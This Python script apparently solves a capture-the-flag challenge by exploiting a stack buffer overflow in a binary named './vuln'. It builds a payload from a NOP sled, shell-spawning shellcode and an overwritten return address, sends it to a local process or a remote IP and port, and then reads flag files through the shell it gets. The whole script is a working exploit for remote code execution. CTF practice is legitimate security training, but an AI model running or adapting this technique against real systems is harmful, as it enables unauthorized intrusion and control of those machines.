#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './vuln'
context.log_level= 'WARN'
mode = args['MODE'].lower()
os.environ['LD_LIBRARY_PATH'] = os.curdir
context.aslr = False

elf = context.binary = ELF(binary)
libc = [x for x in elf.libs.keys() if 'libc.so' in x]
libc = ELF(libc and libc[0] or './libc.so.6')

def exploit():
    if mode == 'debug':
        io = debug(binary)
        io.b([
            # 0x4005F6, # before ret
            # 0x04005EB, # before fgets
        ])
        io.r()
    elif mode == 'remote':
        io = remote('35.205.206.137', 1996)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    nop = asm(shellcraft.nop())
    shellcode = asm(shellcraft.sh())
    info(shellcode)

    if mode == 'remote':
        addr = 0x7fffffffebe0
        # addr = 0x7fffffffffe0 - 0x100 * int(args['OFFSET']) # bruteforce
    else:
        addr = 0x7fffffffdde0
    io.sendline(fit({0: nop * 0x300, 0x300: shellcode, 0x408: addr})) # local

    io.clean(0.01)
    io.sendline('\ncat /home/*/flag*\n')
    print io.recv()

    if mode == 'debug':
        io.interrupt()
        io.sendlines('''
        #'''.strip().split('\n'))

    # io.interactive()

if __name__ == '__main__':
    exploit()
